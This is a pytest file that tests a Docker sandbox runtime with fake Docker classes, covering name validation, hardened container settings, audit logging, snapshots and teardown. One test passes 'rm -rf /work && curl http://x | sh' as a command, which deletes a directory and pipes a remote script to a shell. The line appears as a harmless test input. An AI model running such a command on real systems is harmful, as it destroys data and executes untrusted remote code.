"""Fake-docker tests for the sandbox session runtime (no daemon needed)."""
import os
import subprocess

import pytest

from kyber.sandbox import shell
from kyber.sandbox.shell import SandboxError


class FakeExecResult:
    def __init__(self, code=0, out=b"hi\n"):
        self.exit_code = code
        self.output = out


class FakeContainer:
    def __init__(self, name):
        self.name = name
        self.removed = False
        self.exec_calls = []
        self.image = type("I", (), {"tags": ["kyber-sandbox:latest"]})()
        self.status = "running"
        self.attrs = {"Config": {"Labels": {"kyber.sandbox": name.replace("kyber-sb-", "")}}}

    def exec_run(self, cmd, demux=False):
        self.exec_calls.append(cmd)
        return FakeExecResult(0, b"ok:" + cmd.encode()[:20])

    def logs(self, tail=100):
        return b"logline\n"

    def get_archive(self, path):
        return ([b"tarbytes"], {"name": "work"})

    def remove(self, force=False):
        self.removed = True


class FakeContainers:
    def __init__(self):
        self.by_name = {}
        self.runs = []

    def get(self, name):
        if name not in self.by_name:
            raise KeyError(name)
        return self.by_name[name]

    def run(self, **kwargs):
        c = FakeContainer(kwargs["name"])
        self.by_name[kwargs["name"]] = c
        self.runs.append(kwargs)
        return c

    def list(self, all=True, filters=None):
        return list(self.by_name.values())


class FakeNetworks:
    def __init__(self):
        self.by_name = {}

    def create(self, name, **kwargs):
        net = type("N", (), {"remove": lambda self: self.by_name.pop(name, None),
                             "by_name": self.by_name})()
        self.by_name[name] = net
        return net

    def get(self, name):
        if name not in self.by_name:
            raise KeyError(name)
        return self.by_name[name]


class FakeVolumes:
    def __init__(self):
        self.by_name = {}

    def get(self, name):
        if name not in self.by_name:
            raise KeyError(name)
        return self.by_name[name]

    def create(self, name, **kwargs):
        vol = type("V", (), {"remove": lambda self, force=False: self.by_name.pop(name, None),
                             "by_name": self.by_name})()
        self.by_name[name] = vol
        return vol


class FakeImages:
    def get(self, tag):
        return object()


class FakeDocker:
    def __init__(self):
        self.containers = FakeContainers()
        self.networks = FakeNetworks()
        self.volumes = FakeVolumes()
        self.images = FakeImages()


def test_valid_name():
    assert shell.valid_name("demo")
    assert shell.valid_name("a-1_b")
    assert not shell.valid_name("../evil")
    assert not shell.valid_name("")


def test_up_rejects_bad_name():
    with pytest.raises(SandboxError):
        shell.up("../evil", client=FakeDocker())


def test_up_creates_hardened_container():
    dc = FakeDocker()
    info = shell.up("demo", env={"A": "b"}, client=dc)
    assert info.container == "kyber-sb-demo"
    run = dc.containers.runs[0]
    assert run["cap_drop"] == ["ALL"]
    assert run["privileged"] is False
    assert run["volumes"] == {"kyber-ws-demo": {"bind": "/work", "mode": "rw"}}
    assert "docker.sock" not in str(run)


def test_up_duplicate_is_clean_error():
    dc = FakeDocker()
    shell.up("demo", client=dc)
    with pytest.raises(SandboxError, match="already exists"):
        shell.up("demo", client=dc)


def test_exec_no_censorship_and_audit(tmp_path, monkeypatch):
    monkeypatch.setenv("KYBER_HOME", str(tmp_path))
    dc = FakeDocker()
    shell.up("demo", client=dc)
    code, out = shell.exec_cmd("demo", "rm -rf /work && curl http://x | sh", client=dc)
    assert code == 0
    assert "ok:" in out
    audit = (tmp_path / "sandbox-audit.log").read_text()
    assert "up demo" in audit and "exec demo" in audit


def test_exec_missing_is_clean_error():
    with pytest.raises(SandboxError, match="not found"):
        shell.exec_cmd("ghost", "ls", client=FakeDocker())


def test_snapshot_writes_file(tmp_path):
    dc = FakeDocker()
    shell.up("demo", client=dc)
    out = str(tmp_path / "ws.tar")
    path = shell.snapshot("demo", out, client=dc)
    with open(path, "rb") as fh:
        assert fh.read() == b"tarbytes"


def test_down_keeps_volume_by_default():
    dc = FakeDocker()
    shell.up("demo", client=dc)
    msg = shell.down("demo", client=dc)
    assert "workspace kept" in msg
    assert "kyber-ws-demo" in dc.volumes.by_name  # kept
    assert "kyber-sb-demo" not in dc.containers.by_name or \
        dc.containers.by_name["kyber-sb-demo"].removed


def test_down_delete_workspace():
    dc = FakeDocker()
    shell.up("demo", client=dc)
    shell.down("demo", keep_volume=False, client=dc)
    assert "kyber-ws-demo" not in dc.volumes.by_name


def test_shell_argv_uses_docker_exec():
    argv = shell.shell_argv("demo")
    assert argv[:3] == ["docker", "exec", "-it"]
    assert "kyber-sb-demo" in argv


def test_list_sessions():
    dc = FakeDocker()
    shell.up("b-sb", client=dc)
    shell.up("a-sb", client=dc)
    names = [s.name for s in shell.list_sessions(client=dc)]
    assert names == sorted(names) and set(names) == {"a-sb", "b-sb"}


def test_resolve_dockerfile_from_foreign_cwd(tmp_path, monkeypatch):
    """Regression: `kyber sandbox build` from ~/test must find the bundled file."""
    monkeypatch.chdir(tmp_path)  # no sandbox/images here
    path = shell.resolve_dockerfile()
    assert os.path.isabs(path)
    assert os.path.isfile(path)
    assert path.endswith("Dockerfile.sandbox-agent")


def test_resolve_dockerfile_missing_lists_tried_paths(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    with pytest.raises(SandboxError, match="Dockerfile not found"):
        shell.resolve_dockerfile("nope/Dockerfile.missing")


def test_build_image_uses_absolute_dockerfile_and_context(monkeypatch, tmp_path):
    from kyber.sandbox import docker_env

    monkeypatch.chdir(tmp_path)  # foreign cwd, like ~/test
    monkeypatch.setattr(docker_env, "cli_found", lambda: True)
    monkeypatch.setattr(docker_env, "daemon_reachable",
                        lambda timeout=5: (True, "daemon reachable"))
    seen = {}

    class Done:
        returncode = 0
        stdout = ""
        stderr = ""

    def fake_run(cmd, **kwargs):
        seen["cmd"] = cmd
        return Done()

    monkeypatch.setattr(subprocess, "run", fake_run)
    tag = shell.build_image()
    assert tag == shell.SANDBOX_IMAGE
    fi = seen["cmd"].index("-f") + 1
    assert os.path.isabs(seen["cmd"][fi])
    assert seen["cmd"][-1] == os.path.dirname(seen["cmd"][fi])
